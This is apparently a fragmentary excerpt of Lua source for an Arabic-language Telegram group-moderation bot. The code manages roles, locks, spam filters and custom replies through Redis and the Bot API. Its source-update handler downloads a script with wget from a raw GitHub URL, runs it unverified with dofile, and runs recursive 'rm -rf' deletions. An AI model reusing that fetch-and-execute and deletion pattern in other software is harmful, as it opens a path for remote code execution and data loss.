DevALS:del(AFS..'ALS:Admins:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:VipMem:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:Cleaner:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:Muted:'..data.chat_id_)
Text = "*☆︙تم حذف المكتومين*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local List = DevALS:smembers(AFS..'ALS:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
DevALS:srem(AFS..'ALS:Tkeed:'..data.chat_id_, v)
end
...
DevALS:del(AFS..'ALS:Ban:'..data.chat_id_)
...
DevALS:del(AFS..'ALS:BanAll:')
DevALS:del(AFS..'ALS:MuteAll:')
...
--     Source AFS     --
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevALS:get(AFS..'ALS:Lock:GpRd'..data.chat_id_) then
local ALS = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevALS:smembers(AFS..'ALS:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*☆︙ماكو ردود مضافه*"
else
for k,v in pairs(redod) do
DevALS:del(AFS..'ALS:Gif:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Voice:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Audio:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Photo:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Stecker:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Video:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:File:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Text:GpRed'..v..data.chat_id_)
DevALS:del(AFS..'ALS:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevALS:get(AFS..'ALS:Lock:GpRd'..data.chat_id_) then
local ALS = DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevALS:smembers(AFS.."ALS:Sudo:AllRed")
if #redod == 0 then
Text = "*☆︙ماكو ردود مضافه*"
else
for k,v in pairs(redod) do
DevALS:del(AFS.."ALS:Add:AllRed"..v)
DevALS:del(AFS.."ALS:Gif:AllRed"..v)
DevALS:del(AFS.."ALS:Voice:AllRed"..v)
DevALS:del(AFS.."ALS:Audio:AllRed"..v)
DevALS:del(AFS.."ALS:Photo:AllRed"..v)
DevALS:del(AFS.."ALS:Stecker:AllRed"..v)
DevALS:del(AFS.."ALS:Video:AllRed"..v)
DevALS:del(AFS.."ALS:File:AllRed"..v)
DevALS:del(AFS.."ALS:Text:AllRed"..v)
DevALS:del(AFS.."ALS:Sudo:AllRed")
end
...
local List = DevALS:smembers(AFS.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevALS:del(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevALS:del(AFS.."List:Cmd:Group:New"..data.chat_id_)
end
Text = "☆︙تم حذف الاوامر المضافه في الكروب"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/CmdList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"ا")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"م")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"اد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"مد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"من")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"اس")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"تك")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"تعط")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"تفع")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"ر")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"رر")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"،،")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"رد")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"غ")
DevALS:set(AFS.."Set:Cmd:Group:New1"..data.chat_id_..":#","مسح قائمه العام")
DevALS:sadd(AFS.."List:Cmd:Group:New"..data.chat_id_,"#")
...
DevALS:sadd(AFS..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(AFS..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevALS:sadd(AFS..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
...
DevALS:sadd(AFS.."ALS:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevALS:sadd(AFS.."ALS:ALSConstructor:"..data.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(AFS.."ALS:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevALS:srem(AFS.."ALS:ALSConstructor:"..data.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevALS:sismember(AFS..'ALS:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, '☆︙ هاه ايي والله مشتغل اني مفعله ضلعي')
else
Text = "☆︙تم تفعيل الكروب "..dp.title_
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ TeAm AFS ›",url="t.me/CXRCX"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevALS:sadd(AFS.."ALS:Groups",data.chat_id_)
if not DevALS:get(AFS..'ALS:SudosGp'..data.sender_user_id_..data.chat_id_) and not SecondSudo(data) then 
DevALS:incrby(AFS..'ALS:Sudos'..data.sender_user_id_,1)
DevALS:set(AFS..'ALS:SudosGp'..data.sender_user_id_..data.chat_id_,"ALS")
end
...
DevALS:set(AFS.."ALS:Groups:Links"..data.chat_id_,LinkGroup) 
...
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,dp) 
if not DevALS:sismember(AFS..'ALS:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙الكروب بالتاكيد معطله") 
else
Text = "☆︙تم تعطيل الكروب "..dp.title_
keyboard = {}
keyboard.inline_keyboard = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..data.sender_user_id_}},{{text="‹ TeAm AFS ›",url="t.me/CXRCX"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevALS:srem(AFS.."ALS:Groups",data.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
Text = "☆︙تم ترتيب الاوامر بالشكل التالي ~\n☆︙ ايدي - ا .\n☆︙ رفع مميز - م .\n☆︙رفع ادمن - اد .\n☆︙ رفع مدير - مد . \n☆︙ رفع منشى - من . \n☆︙ رفع منشئ الاساسي - اس  .\n☆︙ رفع مطور - مط .\n☆︙رفع مطور ثانوي - ثانوي .\n☆︙ تنزيل الكل - تك .\n☆︙ تعطيل الايدي بالصوره - تعط .\n☆︙ تفعيل الايدي بالصوره - تفع .\n☆︙ الرابط - ر .\n☆︙ ردود المدير - رر .\n☆︙ مسح المكتومين - ،، .\n☆︙ اضف رد - رد .\n☆︙ مسح سحكاتي - سح .\n☆︙ مسح رسائلي - رس .\n☆︙ غنيلي - غ .\n☆︙مسح قائمه العام"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ TeAm AFS ›',url="t.me/CXRCX"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source David     --
...
DevALS:sadd(AFS..'ALS:BasicConstructor:'..data.chat_id_,Manager_id)  
DevALS:sadd(AFS..'ALS:ALSConstructor:'..data.chat_id_,Manager_id)   
end  
end  
if num == 0 then
EditMsg(Chat_Id2, Msg_Id2,  "☆︙ماكو ادمنيه ليتم رفعهم\n☆︙تم رفع مالك الكروب", 1, 'md')
else
...
local DelSudoRep = DevALS:get(AFS..'DelSudoRep')
DevALS:del(AFS.."ALS:Sudo:AllRed",DelSudoRep)
DevALS:del(AFS.."ALS:Add:AllText"..data.sender_user_id_)
DevALS:del(AFS.."ALS:Add:AllRed"..data.sender_user_id_)
DevALS:del(AFS.."DelSudoRep")
Text = "☆︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ TeAm AFS .',url="t.me/CXRCX"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
local DelManagerRep = DevALS:get(AFS..'DelManagerRep'..data.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevALS:del(AFS..'ALS:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevALS:del(AFS..'ALS:Add:GpRed'..data.sender_user_id_..data.chat_id_)
DevALS:del(AFS..'DelManagerRep'..data.chat_id_)
Text = "☆︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ TeAm AFS .',url="t.me/CXRCX"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Cmd = DevALS:get(AFS..'ALS:Cmd')
local Text = [[
*☆︙من خلال الازرار يمكنك التحكم بأوامر الكروب*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="ترتيب الاوامر",callback_data="/SetCmd:"..data.sender_user_id_},{text="مسح الاوامر المضافه",callback_data="/DelCmd:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Msg = DevALS:get(AFS..'ALS:Msg')
local Text = [[
*☆︙من خلال الازرار يمكنك مسح رسائلك وسحكاتك*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح رسائلي",callback_data="/DelMsg:"..data.sender_user_id_},{text="مسح سحكاتي",callback_data="/DelEdit:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
...
DevALS:del(AFS..'ALS:EditMsg'..data.chat_id_..data.sender_user_id_)
Text = "*☆︙تم حذف جميع تعديلاتك بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/DelHome:"..data.sender_user_id_}},{{text="‹ دوس هنا ومسح الكليشه  ›",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     Source AFS     --
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Filter = DevALS:get(AFS..'ALS:Filter')
local Text = [[
☆︙ها هلو في قائمة المنع ↫ ⤈ 
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
...
DevALS:del(AFS.."ALS:FilterAnimation"..data.chat_id_)
Text = "*☆︙تم حذف جميع المتحركات الممنوعه بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• رجوع •",callback_data="/FilterList:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevALS:del(AFS.."ALS:FilterSteckr"..data.chat_id_)
...
DevALS:del(AFS.."ALS:FilterPhoto"..data.chat_id_)
...
DevALS:del(AFS..'ALS:Filters:'..data.chat_id_)
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local locklist = DevALS:get(AFS..'ALS:locklist')
local Text = [[
☆︙ها هلو في قائمة القفل والفتح ↫ ⤈ 
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local LockBotList = DevALS:get(AFS..'ALS:LockBotList')
local Text = [[
☆︙ها هلو في قائمة قفل البوتات  ↫ ⤈ 
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
*☆︙بالطرد*
*☆︙بالكتم*
*☆︙بالتقيد*
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="قفل البوتات بالطرد",callback_data="/lockBotKick:"..data.sender_user_id_},{text="قفل البوتات بالتقيد",callback_data="/lockBotKed:"..data.sender_user_id_}},{{text="قفل البوتات بالكتم",callback_data="/lockBotDel:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source AFS     --
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local LockSpamList = DevALS:get(AFS..'ALS:LockSpamList')
local Text = [[
☆︙ها هلو في قائمة قفل التكرار  ↫ ⤈ 
┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉
*☆︙بالطرد*
*☆︙بالكتم*
*☆︙بالتقيد*
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="قفل التكرار بالطرد",callback_data="/lockSpamKick:"..data.sender_user_id_},{text="قفل التكرار بالتقيد",callback_data="/lockSpamKed:"..data.sender_user_id_}},{{text="قفل التكرار بالحذف",callback_data="/lockSpamDel:"..data.sender_user_id_},{text="قفل التكرار بالكتم",callback_data="/lockSpamMute:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source AFS     --
if DataText == '/lockjoin:'..data.sender_user_id_ then
if not DevALS:get(AFS..'ALS:Lock:Join'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Join'..data.chat_id_,true)
Text = "*☆︙تم قفل الدخول بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/locklist:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
end
if DataText == '/unlockjoin:'..data.sender_user_id_ then
if DevALS:get(AFS..'ALS:Lock:Join'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Join'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Text'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Text'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:Text'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Text'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:TagServr'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:TagServr'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:TagServr'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:TagServr'..data.chat_id_) 
...
if not DevALS:get(AFS..'ALS:Lock:EditMsgs'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:EditMsgs'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:EditMsgs'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:EditMsgs'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Stickers'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Stickers'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:Stickers'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Stickers'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Gifs'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Gifs'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:Gifs'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Gifs'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Photo'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Photo'..data.chat_id_,true) 
...
if DevALS:get(AFS..'ALS:Lock:Photo'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Photo'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Videos'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Videos'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:Videos'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Videos'..data.chat_id_)
...
if not DevALS:get(AFS..'ALS:Lock:Forwards'..data.chat_id_) then
DevALS:set(AFS..'ALS:Lock:Forwards'..data.chat_id_,true)
...
if DevALS:get(AFS..'ALS:Lock:Forwards'..data.chat_id_) then
DevALS:del(AFS..'ALS:Lock:Forwards'..data.chat_id_) 
...
DevALS:set(AFS.."ALS:Lock:Bots"..data.chat_id_,"kick")  
Text = "*☆︙تم قفل البوتات بالطرد بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/LockBotList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockBotKed:'..data.sender_user_id_ then
DevALS:set(AFS.."ALS:Lock:Bots"..data.chat_id_,"ked")   
...
DevALS:set(AFS.."ALS:Lock:Bots"..data.chat_id_,"del")  
...
DevALS:del(AFS.."ALS:Lock:Bots"..data.chat_id_) 
...
DevALS:hset(AFS.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
Text = "*☆︙تم قفل التكرار بالطرد بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/LockSpamList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockSpamKed:'..data.sender_user_id_ then
DevALS:hset(AFS.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
DevALS:hset(AFS.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
DevALS:hset(AFS.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
DevALS:hdel(AFS.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Source = DevALS:get(AFS..'ALS:Source')
local Text = [[
*☆︙ هاك ضلعي  ازرار تحديث السورس والملفات*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="تحديث السورس",callback_data="/UpdateSource:"..data.sender_user_id_},{text="تحديث الملفات",callback_data="/UpdateFile:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source AFS     -- 
...
os.execute('rm -rf AFS.lua') 
os.execute('wget https://raw.githubusercontent.com/XEX-Murtaza/AFS/main/AFS.lua') 
dofile('AFS.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Text = "*☆︙تم تحديث السورس*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/SourceList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Media = DevALS:get(AFS..'ALS:Media')
local Text = [[
*☆︙ هاك ضلعي  ازرار مسح الميديا*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="مسح الميديا",callback_data="/DelMedia:"..data.sender_user_id_},{text="مسح الاغاني",callback_data="/DelMusic:"..data.sender_user_id_}},{{text="مسح الرسائل المعدله",callback_data="/DelMsgEdit:"..data.sender_user_id_}},{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source AFS     -- 
...
local List = DevALS:smembers(AFS.."ALS:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
Text = "*☆︙ماكو ميديا هنا*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/MediaHome:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
...
local List = DevALS:smembers(AFS.."ALS:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(AFS.."ALS:cleanermusic"..data.chat_id_)
else
Text = "*☆︙ماكو اغاني هنا*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/MediaHome:"..data.sender_user_id_}}}
...
if DevALS:get(AFS.."ALS:Left:Bot"..AFS) then
...
if not DevALS:get(AFS.."ALS:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevALS:get(AFS.."Private:Group:Link"..data.chat_id_) 
...
if not DevALS:get(AFS..'ALS:Lock:GpLinks'..data.chat_id_) then 
if DevALS:get(AFS.."ALS:Groups:Links"..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙Group Link ↬ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n"..DevALS:get(AFS.."ALS:Groups:Links"..data.chat_id_), 1, "html")
else 
...
DevALS:set(AFS..'ALS:Lock:Id:Photo'..data.chat_id_,true)
Text = "*☆︙تم تعطيل الايدي بالصوره*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• دوس هنا ومسح الكليشه  •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevALS:del(AFS..'ALS:Lock:Id:Photo'..data.chat_id_)
...
DevALS:set(AFS..'ALS:Lock:Id'..data.chat_id_,true)
...
DevALS:del(AFS..'ALS:Lock:Id'..data.chat_id_)
...
DevALS:set(AFS.."ALS:Lock:GpLinks"..data.chat_id_,"ok")
...
DevALS:del(AFS.."ALS:Lock:GpLinks"..data.chat_id_)
...
DevALS:set(AFS.."ALS:Lock:GpLinksinline"..data.chat_id_,"ok")
...
DevALS:del(AFS.."ALS:Lock:GpLinksinline"..data.chat_id_)
...
DevALS:del(AFS.."ALS:Lock:Welcome"..data.chat_id_)
...
DevALS:set(AFS.."ALS:Lock:Welcome"..data.chat_id_,true)
...
DevALS:set(AFS..'ALS:Lock:AllRed'..data.chat_id_,true)
...
DevALS:del(AFS..'ALS:Lock:AllRed'..data.chat_id_)
...
DevALS:set(AFS..'ALS:Lock:GpRed'..data.chat_id_,true)
...
